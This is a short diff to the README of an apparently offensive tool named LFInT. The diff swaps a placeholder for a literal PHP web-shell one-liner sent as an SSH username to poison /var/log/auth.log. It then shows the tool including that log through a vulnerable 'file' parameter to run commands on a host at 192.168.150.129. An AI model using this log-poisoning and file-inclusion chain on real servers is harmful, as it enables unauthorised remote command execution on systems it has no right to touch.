@@ -13,6 +13,6 @@ pycurl, argparse, sys, os, StringIO
 
 ## Example
 ### using evilscience
-ssh '*php oneliner*'@192.168.150.129
+`ssh '<?php echo system($_GET[cmd]); ?>'@192.168.150.129`
 
-./LFInT -u http://192.168.150.129/index.php?file=/var/log/auth.log -v cmd
+`./LFInT -u http://192.168.150.129/index.php?file=/var/log/auth.log -v cmd`
